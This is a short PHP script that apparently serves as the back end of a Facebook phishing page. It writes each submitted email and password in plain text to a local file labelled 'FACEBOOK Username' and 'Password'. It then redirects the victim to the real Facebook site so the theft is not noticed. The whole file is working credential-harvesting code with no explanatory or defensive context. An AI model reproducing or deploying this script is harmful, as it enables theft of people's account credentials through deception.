<?php

file_put_contents("./mydata.txt", "FACEBOOK Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/');
exit();
                                                                  
